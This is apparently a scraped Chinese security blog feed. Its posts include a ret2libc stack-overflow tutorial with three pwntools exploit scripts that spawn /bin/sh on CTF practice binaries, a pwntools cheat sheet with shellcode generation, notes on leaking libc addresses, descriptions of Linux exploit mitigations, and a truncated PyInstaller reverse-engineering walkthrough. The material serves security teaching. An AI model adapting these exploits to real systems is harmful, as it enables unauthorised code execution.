shell">.plt:08048460 ; [00000006 BYTES: COLLAPSED FUNCTION _system. PRESS CTRL-NUMPAD+ TO EXPAND]<br></code></pre></td></tr></table></figure><p>那么，我们直接返回该处，即执行 system 函数。相应的 payload 如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = process(<span class="hljs-string">&#x27;./ret2libc1&#x27;</span>)<br><br>binsh_addr = <span class="hljs-number">0x8048720</span><br>system_plt = <span class="hljs-number">0x08048460</span><br>payload = flat([<span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">112</span>, system_plt, <span class="hljs-string">&#x27;b&#x27;</span> * <span class="hljs-number">4</span>, binsh_addr])<br>sh.sendline(payload)<br><br>sh.interactive()<br></code></pre></td></tr></table></figure><p>这里我们需要注意函数调用栈的结构，如果是正常调用 system 函数，我们调用的时候会有一个对应的返回地址，这里以’bbbb’ 作为虚假的地址，其后参数对应的参数内容。</p><p>这个例子相对来说简单，同时提供了 system 地址与 &#x2F;bin&#x2F;sh 的地址，但是大多数程序并不会有这么好的情况。</p><h4 id="例-2"><a href="#例-2" class="headerlink" title="例 2"></a>例 2</h4><p>该题目与例 1 基本一致，只不过不再出现 &#x2F;bin&#x2F;sh 字符串，所以此次需要我们自己来读取字符串，所以我们需要两个 gadgets，第一个控制程序读取字符串，第二个控制程序执行 system(“&#x2F;bin&#x2F;sh”)。由于漏洞与上述一致，这里就不在多说，具体的 exp 如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">##!/usr/bin/env python</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = process(<span class="hljs-string">&#x27;./ret2libc2&#x27;</span>)<br><br>gets_plt = <span class="hljs-number">0x08048460</span><br>system_plt = <span class="hljs-number">0x08048490</span><br>pop_ebx = <span class="hljs-number">0x0804843d</span><br>buf2 = <span class="hljs-number">0x804a080</span><br>payload = flat(<br>    [<span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">112</span>, gets_plt, pop_ebx, buf2, system_plt, <span class="hljs-number">0xdeadbeef</span>, buf2])<br>sh.sendline(payload)<br>sh.sendline(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>)<br>sh.interactive()<br></code></pre></td></tr></table></figure><p>需要注意的是，我这里向程序中 bss 段的 buf2 处写入 &#x2F;bin&#x2F;sh 字符串，并将其地址作为 system 的参数传入。这样以便于可以获得 shell。</p><h4 id="例-3"><a href="#例-3" class="headerlink" title="例 3"></a>例 3</h4><p>在例 2 的基础上，再次将 system 函数的地址去掉。此时，我们需要同时找到 system 函数地址与 &#x2F;bin&#x2F;sh 字符串的地址。首先，查看安全保护</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">➜  ret2libc3 checksec ret2libc3<br>    Arch:     i386-32-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX enabled<br>    PIE:      No PIE (0x8048000)<br></code></pre></td></tr></table></figure><p>可以看出，源程序仍旧开启了堆栈不可执行保护。进而查看源码，发现程序的 bug 仍然是栈溢出</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">int</span> v4; <span class="hljs-comment">// [sp+1Ch] [bp-64h]@1</span><br><br>  <span class="hljs-built_in">setvbuf</span>(stdout, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">setvbuf</span>(stdin, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;No surprise anymore, system disappeard QQ.&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Can you find it !?&quot;</span>);<br>  <span class="hljs-built_in">gets</span>((<span class="hljs-type">char</span> *)&amp;v4);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>那么我们如何得到 system 函数的地址呢？这里就主要利用了两个知识点</p><ul><li>system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。</li><li>即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。而 libc 在 github 上有人进行收集，如下</li><li><a href="https://github.com/niklasb/libc-database">https://github.com/niklasb/libc-database</a></li></ul><p>所以如果我们知道 libc 中某个函数的地址，那么我们就可以确定该程序利用的 libc。进而我们就可以知道 system 函数的地址。</p><p>那么如何得到 libc 中的某个函数的地址呢？我们一般常用的方法是采用 got 表泄露，即输出某个函数对应的 got 表项的内容。<strong>当然，由于 libc 的延迟绑定机制，我们需要泄漏已经执行过的函数的地址。</strong></p><p>我们自然可以根据上面的步骤先得到 libc，之后在程序中查询偏移，然后再次获取 system 地址，但这样手工操作次数太多，有点麻烦，这里给出一个 libc 的利用工具，具体细节请参考 readme</p><ul><li><a href="https://github.com/lieanu/LibcSearcher">https://github.com/lieanu/LibcSearcher</a></li></ul><p>此外，在得到 libc 之后，其实 libc 中也是有 &#x2F;bin&#x2F;sh 字符串的，所以我们可以一起获得 &#x2F;bin&#x2F;sh 字符串的地址。</p><p>这里我们泄露 __libc_start_main 的地址，这是因为它是程序最初被执行的地方。基本利用思路如下</p><ul><li>泄露 __libc_start_main 地址</li><li>获取 libc 版本</li><li>获取 system 地址与 &#x2F;bin&#x2F;sh 的地址</li><li>再次执行源程序</li><li>触发栈溢出执行 system(‘&#x2F;bin&#x2F;sh’)</li></ul><p>exp 如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> LibcSearcher<br>sh = process(<span class="hljs-string">&#x27;./ret2libc3&#x27;</span>)<br><br>ret2libc3 = ELF(<span class="hljs-string">&#x27;./ret2libc3&#x27;</span>)<br><br>puts_plt = ret2libc3.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>libc_start_main_got = ret2libc3.got[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>main = ret2libc3.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<br><br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;leak libc_start_main_got addr and return to main again&quot;</span><br>payload = flat([<span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">112</span>, puts_plt, main, libc_start_main_got])<br>sh.sendlineafter(<span class="hljs-string">&#x27;Can you find it !?&#x27;</span>, payload)<br><br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;get the related addr&quot;</span><br>libc_start_main_addr = u32(sh.recv()[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>])<br>libc = LibcSearcher(<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>, libc_start_main_addr)<br>libcbase = libc_start_main_addr - libc.dump(<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>)<br>system_addr = libcbase + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>binsh_addr = libcbase + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;get shell&quot;</span><br>payload = flat([<span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">104</span>, system_addr, <span class="hljs-number">0xdeadbeef</span>, binsh_addr])<br>sh.sendline(payload)<br><br>sh.interactive()<br></code></pre></td></tr></table></figure><h2 id="参考阅读"><a href="#参考阅读" class="headerlink" title="参考阅读"></a>参考阅读</h2><ul><li><a href="http://wooyun.jozxing.cc/static/drops/tips-6597.html">乌云一步一步 ROP 篇 (蒸米)</a></li><li><a href="https://zhuanlan.zhihu.com/p/25816426">手把手教你栈溢出从入门到放弃（上）</a></li><li><a href="https://zhuanlan.zhihu.com/p/25892385">手把手教你栈溢出从入门到放弃（下）</a></li><li><a href="http://bobao.360.cn/learning/detail/3694.ht">【技术分享】现代栈溢出利用技术基础：ROP</a></li><li><a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/">ctfwiki 基本的rop</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>rop</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pwntools</title>
    <link href="/2024/03/10/pwn/pwntools/"/>
    <url>/2024/03/10/pwn/pwntools/</url>
    
    <content type="html"><![CDATA[<h3 id="asm汇编与反汇编"><a href="#asm汇编与反汇编" class="headerlink" title="asm汇编与反汇编"></a>asm汇编与反汇编</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>asm(<span class="hljs-string">&#x27;mov eax, 0&#x27;</span>)   <span class="hljs-comment">#汇编</span><br><span class="hljs-string">&#x27;\xb8\x00\x00\x00\x00&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>disasm(<span class="hljs-string">&#x27;\xb8\x0b\x00\x00\x00&#x27;</span>)  <span class="hljs-comment">#反汇编</span><br><span class="hljs-string">&#x27;   0:   b8 0b 00 00 00          mov    eax,0xb&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="elf文件操作"><a href="#elf文件操作" class="headerlink" title="elf文件操作"></a>elf文件操作</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>e = ELF(<span class="hljs-string">&#x27;/bin/cat&#x27;</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(e.address)  <span class="hljs-comment"># 文件装载的基地址</span><br><span class="hljs-number">0x400000</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(e.symbols[<span class="hljs-string">&#x27;write&#x27;</span>]) <span class="hljs-comment"># 函数地址</span><br><span class="hljs-number">0x401680</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(e.got[<span class="hljs-string">&#x27;write&#x27;</span>]) <span class="hljs-comment"># GOT表的地址</span><br><span class="hljs-number">0x60b070</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(e.plt[<span class="hljs-string">&#x27;write&#x27;</span>]) <span class="hljs-comment"># PLT的地址</span><br><span class="hljs-number">0x401680</span><br></code></pre></td></tr></table></figure><h3 id="shellcode使用"><a href="#shellcode使用" class="headerlink" title="shellcode使用"></a>shellcode使用</h3><p><strong>pwnlib.shellcraft模块</strong>包含<strong>生成shell代码</strong>的函数。<br>其中的子模块声明结构，比如</p><ul><li>ARM架构: shellcraft.arm</li><li>AMD64架构: shellcraft.amd64</li><li>Intel 80386架构: shellcraft.i386</li><li>通用: shellcraft.common</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><br>context(arch=<span class="hljs-string">&#x27;i386&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br>shellcode = asm(shellcraft.sh())<br></code></pre></td></tr></table></figure><h3 id="remote-process读写接口"><a href="#remote-process读写接口" class="headerlink" title="remote&#x2F;process读写接口"></a>remote&#x2F;process读写接口</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 第一种连接方式，通过ip和port去连接</span><br>conn = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, <span class="hljs-number">8888</span>)  <br><span class="hljs-comment"># 第二种连接方式，通过ssh连接</span><br>shell = ssh(host=<span class="hljs-string">&#x27;192.168.14.144&#x27;</span>, user=<span class="hljs-string">&#x27;root&#x27;</span>, port=<span class="hljs-number">2222</span>, password=<span class="hljs-string">&#x27;123456&#x27;</span>)<br><br><span class="hljs-comment">#接受或者发送数据</span><br>conn.send(data) <span class="hljs-comment">#发送数据</span><br>conn.sendline(data) <span class="hljs-comment">#发送一行数据，相当于在数据后面加\n</span><br><span class="hljs-comment">#接收数据，numb制定接收的字节，timeout指定超时</span><br>conn.recv(numb = <span class="hljs-number">2048</span>, timeout = default)<br><span class="hljs-comment">#接受一行数据，keepends为是否保留行尾的\n</span><br>conn.recvline(keepends=<span class="hljs-literal">True</span>)<br><span class="hljs-comment">#接受数据直到我们设置的标志出现</span><br>conn.recvuntil(<span class="hljs-string">&quot;Hello,World\n&quot;</span>,drop=fasle) <br>conn.recvall()  <span class="hljs-comment">#一直接收直到 EOF</span><br>conn.recvrepeat(timeout = default)  <span class="hljs-comment">#持续接受直到EOF或timeout</span><br><span class="hljs-comment">#直接进行交互，相当于回到shell的模式，在取得shell之后使用</span><br>conn.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>工具</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>获取地址</title>
    <link href="/2024/03/09/pwn/%E8%8E%B7%E5%8F%96%E5%9C%B0%E5%9D%80/"/>
    <url>/2024/03/09/pwn/%E8%8E%B7%E5%8F%96%E5%9C%B0%E5%9D%80/</url>
    
    <content type="html"><![CDATA[<p>在漏洞利用的过程中，我们常常需要获取一些变量，函数的地址，以便于能够进行进一步的利用。这里我将获取地址的方法分为如下几类</p><ul><li>直接寻找地址，即我们可以通过反编译等手段直接看到对应符号的地址。</li><li>泄漏地址，即需要我们通过控制程序的执行流来泄漏程序中的某些符号指针的内容，来获取对应的地址。</li><li>推测地址，这里我们一般常用的就是根据某个段内的符号之间的偏移是固定的，从而来推断一些新的符号的地址。</li><li>猜测地址，一般主要指的是，我们需要自己去猜测对应符号的地址，这里伴随的往往就是暴力枚举了。</li></ul><p>上述几种方法，是一种递进地考虑方式，我们在获取相关符号的地址时，应保持这样的思考方式。</p><p>在上面的几种方式中，我认为主要有两点核心思想</p><ul><li>充分利用代码本身的性质，比如程序某些代码的位置就是固定的，如不开启 PIE 时，代码段的位置；再比如，glibc 的后三位是固定的。</li><li>充分利用相对偏移的性质，这是由于目前程序加载时往往加载的内存都是一段一段的，所以相对偏移往往是固定的。</li></ul><p>更加具体的，我们可以看如下的介绍。</p><h3 id="直接寻找地址"><a href="#直接寻找地址" class="headerlink" title="直接寻找地址"></a>直接寻找地址</h3><p>程序中已经给出了相关变量或者函数的地址了。这时候，我们就可以直接进行利用了。</p><p>这种情形往往适用于程序没有开启 PIE 的情况。</p><h3 id="泄漏地址"><a href="#泄漏地址" class="headerlink" title="泄漏地址"></a>泄漏地址</h3><p>在泄漏地址的过程中，我们往往需要找到一些敏感的指针，这些指针里存储着要么就是我们想要的符号的地址，要么就是与我们想要的符号的地址相关。</p><p>下面给出几个例子。</p><h4 id="泄漏变量指针"><a href="#泄漏变量指针" class="headerlink" title="泄漏变量指针"></a>泄漏变量指针</h4><p>比如</p><ol><li>泄漏 main arena 中各种 bin 的头表指针，可能就可以获取堆中或者 glibc 中某个变量的地址。</li></ol><h4 id="泄漏-got-表"><a href="#泄漏-got-表" class="headerlink" title="泄漏 got 表"></a>泄漏 got 表</h4><p>有时候我们并不一定非得直接知道某个函数的地址，可以利用 GOT 表跳转到对应函数的地址。当然，如果我们非得知道这个函数的地址，我们可以利用 write，puts 等输出函数将 GOT 表中地址处对应的内容输出出来（<strong>前提是这个函数已经被解析一次了</strong>）。</p><h4 id="ret2dl-resolve"><a href="#ret2dl-resolve" class="headerlink" title="ret2dl-resolve"></a>ret2dl-resolve</h4><p>当 ELF 文件采用动态链接时，got 表会采用延迟绑定技术。当第一次调用某个 libc 函数时，程序会调用_dl_runtime_resolve 函数对其地址解析。因此，我们可以利用栈溢出构造 ROP 链，伪造对其他函数（如：system）的解析。这也是我们在高级 rop 中介绍的技巧。</p><h4 id="proc-self-maps"><a href="#proc-self-maps" class="headerlink" title="&#x2F;proc&#x2F;self&#x2F;maps"></a>&#x2F;proc&#x2F;self&#x2F;maps</h4><p>我们可以考虑通过读取程序的 <code>/proc/self/maps</code>来获取与程序相关的基地址。</p><h3 id="推测地址"><a href="#推测地址" class="headerlink" title="推测地址"></a>推测地址</h3><p>在大多数情况下，我们都不能直接获取想要的函数的地址，往往需要进行一些地址的推测，正如上面所说，这里就重点依赖于符号间的偏移是固定的这一思想。</p><h4 id="Stack-Related"><a href="#Stack-Related" class="headerlink" title="Stack Related"></a>Stack Related</h4><p>关于栈上的地址，其实我们大多时候并不需要具体的栈地址，但是我们可以根据栈的寻址方式，推测出栈上某个变量相对于 EBP 的位置。</p><h4 id="Glibc-Related"><a href="#Glibc-Related" class="headerlink" title="Glibc Related"></a>Glibc Related</h4><p>这里主要考虑的是如何找到 Glibc 中相关的函数。</p><h5 id="有-libc"><a href="#有-libc" class="headerlink" title="有 libc"></a>有 libc</h5><p>这时候我们就需要考虑利用 libc 中函数的基地址一样这个特性来寻找了。比如我们可以通过 __libc_start_main 的地址来泄漏 libc 在内存中的基地址。</p><p><strong>注意：不要选择有 wapper 的函数，这样会使得函数的基地址计算不正确。</strong></p><p>常见的有 wapper 的函数有？（待补充）。</p><h5 id="无-libc"><a href="#无-libc" class="headerlink" title="无 libc"></a>无 libc</h5><p>其实，这种情况的解决策略分为两种</p><ul><li>想办法获取 libc</li><li>想办法直接获取对应的地址。</li></ul><p>而对于想要泄露的地址，我们只是单纯地需要其对应的内容，所以 puts ， write，printf 均可以。</p><ul><li>puts，printf 会有 \x00 截断的问题</li><li>write 可以指定长度输出的内容。</li></ul><p>下面是一些相应的方法</p><h4 id="PWNLIB-DYNELF"><a href="#PWNLIB-DYNELF" class="headerlink" title="PWNLIB.DYNELF"></a>PWNLIB.DYNELF</h4><p>前提是我们可以泄露任意地址的内容。</p><ul><li><strong>如果要使用 write 函数泄露的话，一次最好多输出一些地址的内容，因为我们一般是只是不断地向高地址读内容，很有可能导致高地址的环境变量被覆盖，就会导致 shell 不能启动。</strong></li></ul><h4 id="LIBC-数据库"><a href="#LIBC-数据库" class="headerlink" title="LIBC 数据库"></a>LIBC 数据库</h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># 更新数据库</span><br>./<span class="hljs-built_in">get</span><br><span class="hljs-comment"># 将已有libc添加到数据库中</span><br>./<span class="hljs-built_in">add</span> libc.so <br><span class="hljs-comment"># Find all the libc&#x27;s in the database that have the given names at the given addresses. </span><br>./<span class="hljs-built_in">find</span> function1 addr function2 addr<br><span class="hljs-comment"># Dump some useful offsets, given a libc ID. You can also provide your own names to dump.</span><br>./dump __libc_start_main_ret<span class="hljs-built_in"> system </span>dup2<br></code></pre></td></tr></table></figure><p>去 libc 的数据库中找到对应的和已经出现的地址一样的 libc，这时候很有可能是一样的。</p><p>也可以使用如下的在线网站:</p><ul><li><a href="http://libcdb.com/">libcdb.com</a></li><li><a href="https://libc.blukat.me/">libc.blukat.me</a></li></ul><p><strong>当然，还有上面提到的 <a href="https://github.com/lieanu/LibcSearcher%E3%80%82">https://github.com/lieanu/LibcSearcher。</a></strong></p><h4 id="Heap-related"><a href="#Heap-related" class="headerlink" title="Heap related"></a>Heap related</h4><p>关于堆的一些地址的推测，这就需要我们比较详细地知道堆里分配了多少内存，目前泄漏出的内存地址是哪一块，进而获取堆的基地址，以及堆中相关的内存地址。</p><h2 id="猜测地址"><a href="#猜测地址" class="headerlink" title="猜测地址"></a>猜测地址</h2><p>在一些比较奇怪的情况下，我们可能可以使用如下的方式</p><ul><li>使用一些暴力的方法来获取地址，比如 32 位时，地址随机化的空间比较小。</li><li>当程序被特殊部署时，其不同的库被加载的位置可能会比较特殊。我们可以在本地尝试，然后猜测远程的情况。</li></ul>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>linux程序的保护机制</title>
    <link href="/2024/03/09/pwn/linux%E7%A8%8B%E5%BA%8F%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/"/>
    <url>/2024/03/09/pwn/linux%E7%A8%8B%E5%BA%8F%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/</url>
    
    <content type="html"><![CDATA[<h3 id="一、常见的保护程序方法"><a href="#一、常见的保护程序方法" class="headerlink" title="一、常见的保护程序方法"></a>一、常见的保护程序方法</h3><h4 id="0011-CANNARY-栈保护"><a href="#0011-CANNARY-栈保护" class="headerlink" title="0011.CANNARY(栈保护)"></a>0011.CANNARY(栈保护)</h4><p>​栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。</p><h4 id="2-FORTIFY"><a href="#2-FORTIFY" class="headerlink" title="2.FORTIFY"></a>2.FORTIFY</h4><p>​fority其实非常轻微的检查，用于检查是否存在缓冲区溢出的错误。适用情形是程序采用大量的字符串或者内存操作函数，如memcpy，memset，stpcpy，strcpy，strncpy，strcat，strncat，sprintf，snprintf，vsprintf，vsnprintf，gets以及宽字符的变体。</p><p><em>FORTIFY_SOURCE设为1，并且将编译器设置为优化1(<em>gcc -O1</em>)，以及出现上述情形，那么程序编译时就会进行检查但又不会改变程序功能</em><br>FORTIFY_SOURCE设为2，有些检查功能会加入，但是这可能导致程序崩溃。</p><p>gcc -D_FORTIFY_SOURCE&#x3D;1<code>仅仅只会在编译时进行检查 (特别像某些头文件</code>#include &lt;string.h&gt;<code>)</code><br>gcc -D_FORTIFY_SOURCE&#x3D;2&#96; 程序执行时也会有检查 (如果检查到缓冲区溢出，就终止程序)</p><h4 id="3-NX（DEP）"><a href="#3-NX（DEP）" class="headerlink" title="3.NX（DEP）"></a>3.NX（DEP）</h4><p>​NX即No-eXecute（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。</p><h4 id="4-PIE（ASLR）"><a href="#4-PIE（ASLR）" class="headerlink" title="4.PIE（ASLR）"></a>4.PIE（ASLR）</h4><p>一般情况下NX（Windows平台上称其为DEP）和地址空间分布随机化（ASLR）会同时工作。<br>内存地址随机化机制（address space layout randomization)，有以下三种情况</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">0 </span>- 表示关闭进程地址空间随机化。<br><span class="hljs-symbol">1 </span>- 表示将mmap的基址，stack和vdso页面随机化。<br><span class="hljs-symbol">2 </span>- 表示在<span class="hljs-number">1</span>的基础上增加栈（heap）的随机化。<br></code></pre></td></tr></table></figure><p>可以防范基于Ret2libc方式的针对DEP的攻击。ASLR和DEP配合使用，能有效阻止攻击者在堆栈上运行恶意代码。</p><p>Built as PIE：位置独立的可执行区域（position-independent executables）。这样使得在利用缓冲溢出和移动操作系统中存在的其他内存崩溃缺陷时采用面向返回的编程（return-oriented programming）方法变得难得多。</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>python 打包程序逆向</title>
    <link href="/2024/03/09/%E9%80%86%E5%90%91/python%20%E6%89%93%E5%8C%85%E7%A8%8B%E5%BA%8F%E9%80%86%E5%90%91/"/>
    <url>/2024/03/09/%E9%80%86%E5%90%91/python%20%E6%89%93%E5%8C%85%E7%A8%8B%E5%BA%8F%E9%80%86%E5%90%91/</url>
    
    <content type="html"><![CDATA[<h4 id="1-用-Detect-It-Easy查看："><a href="#1-用-Detect-It-Easy查看：" class="headerlink" title="1.用 Detect It Easy查看："></a>1.用 Detect It Easy查看：</h4><p>打包工具为pyinstaller</p><h4 id="2-反编译可执行程序"><a href="#2-反编译可执行程序" class="headerlink" title="2.反编译可执行程序"></a>2.反编译可执行程序</h4><p>我们下载反编译工具<strong>pyinstxtractor.py</strong>与我们要反编译的.exe文件放入同一个工作目录下，如下图所示：</p><p><img src="https://raw.githubusercontent.com/1154619573/image/main/909733_X2KAP5KQVCZ9UWP.png" alt="图片描述"></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">.\pyinstxtractor.<span class="hljs-keyword">py</span> 测试脚本.<span class="hljs-keyword">exe</span><br></code></pre></td></tr></table></figure><p>执行完毕，看到<code>Successfully</code>字样，会生成<code>测试脚本.exe_extracted</code>文件夹，如下图所示：<br><img src="https://raw.githubusercontent.com/1154619573/image/main/909733_TSVJWEKQZXT6H2V-20240324174809871-20240324174841656.png" alt="图片描述"><br>进入该文件夹，里面有许许多多后缀为<code>.dll</code>和<code>.pyd</code>的文件，还有一个名为<code>PYZ-00.pyz_extracted</code>的文件夹，这个文件夹里放的是程序引入的<code>依赖库</code>，如果你引入过自己其他的<code>.py</code>文件，就可以用类似的方法将依赖的<code>.py</code>文件反编译出来，如下图所示：<br><img src="https://raw.githubusercontent.com/1154619573/image/main/909733_P5ZJS35R4ZH64FK.png" alt="图片描述"><br>在目录中我们要找到<code>struct</code>和与你的<code>.exe</code>文件同名的文件。如下图所示：<br><img src="https://raw.githubusercontent.com/1154619573/image/main/909733_N58BJTSJQ6UH42K.png" alt="图片描述"><br>这两个文件是否带<code>.pyc</code>后缀和你使用的<code>pyinstxtractor.py</code>工具版本有关系。V2.0以前的版本，会生成两个不带<code>.pyc</code>后缀的文件，手动为它添加<code>.pyc</code>后缀即可。如下图所示：<br><img src="https://raw.githubusercontent.com/1154619573/image/main/909733_KK2YYUE5ERUAB9J.png" alt="图片描述"><br>当前这个<code>测试脚本.pyc</code>文件是没有<code>Magic Number</code>的，我们需要根据Python版本自行补全，由上图可知打包此程序的Python版本为3.6，我们接下来就需要查3.6版本的<code>Magic Number</code>。</p><h4 id="3-看struct-pyc文件："><a href="#3-看struct-pyc文件：" class="headerlink" title="3.看struct.pyc文件："></a>3.看<code>struct.pyc</code>文件：</h4><p>将<code>struct.pyc</code>文件使用<code>WinHex编辑器</code>打开，它的前4位字节就是<code>magic 